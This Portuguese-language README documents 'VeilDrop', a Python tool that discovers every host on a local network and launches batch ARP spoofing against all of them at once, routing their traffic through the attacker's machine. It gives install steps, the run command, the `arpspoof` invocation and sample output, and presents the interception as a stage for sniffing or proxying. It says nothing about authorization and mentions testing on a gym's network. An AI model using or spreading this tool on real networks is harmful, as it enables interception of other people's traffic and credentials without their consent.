# VeilDrop

Pequeno utilitário que “joga o véu” sobre a LAN: descobre todos os hosts em segundos e, se quiser, assume o controle do tráfego com ARP-spoof em lote.  
Nada de interface gráfica, nem dependências pesadas – só Python 3, Scapy e o binário `arpspoof` do pacote **dsniff**.

## Instalar

```bash
# Debian / Ubuntu / Kali
sudo apt update && sudo apt install python3 python3-pip dsniff
pip3 install scapy netifaces ipaddress

# Arch
sudo pacman -S python python-pip scapy dsniff
pip install --user netifaces

```

Clone ou copie o arquivo veildrop.py, dá permissão de execução e já era.
bash

    chmod +x veildrop.py

# Usar

Somente reconhecimento (scan silencioso)

    sudo python3 veildrop.py

Gera ips.txt com a lista de máquinas ativas e para por aí.

# Reconhecimento + ataque
O mesmo comando acima, mas sem cortar com CTRL+C, mantém o spoof ativo pra sempre.
Quando quiser parar, CTRL+C mata todos os processos arpspoof automaticamente.

Rodar numa interface diferente (opcional)
bash

    sudo VEIL_IFACE=eth0 python3 veildrop.py

Se quiser forçar placa de rede, exporte a variável.

# Como funciona

    Manda um ARP-who-has para cada endereço da sub-rede local.
    Guarda quem respondeu, filtra seu próprio IP, gateway e broadcast.
    Para cada host restante, executa em paralelo:
    code

    arpspoof -i iface -t <host> <gateway>

Isso faz o host acreditar que o seu notebook é o roteador, e o roteador acreditar que você é o host.
    Tráfego passa por você – stage perfeito para sniffers, proxy ou qualquer outra brincadeira.

Saída padrão
code

Escaneando rede: 192.168.1.0/24 na interface wlan0...
7 hosts ativos salvos em ips.txt
ARP spoofing iniciado em todos os hosts. Pressione CTRL+C para parar.

# Detalhes rápidos

Não precisa de arquivo de config.
Trava o sinal SIGINT (CTRL+C) pra dar cleanup certinho.
Compatível com Python 3.7+.
Testado em Wi-Fi doméstico, cabo de academia e laboratório – mesma lógica, qualquer LAN comum.
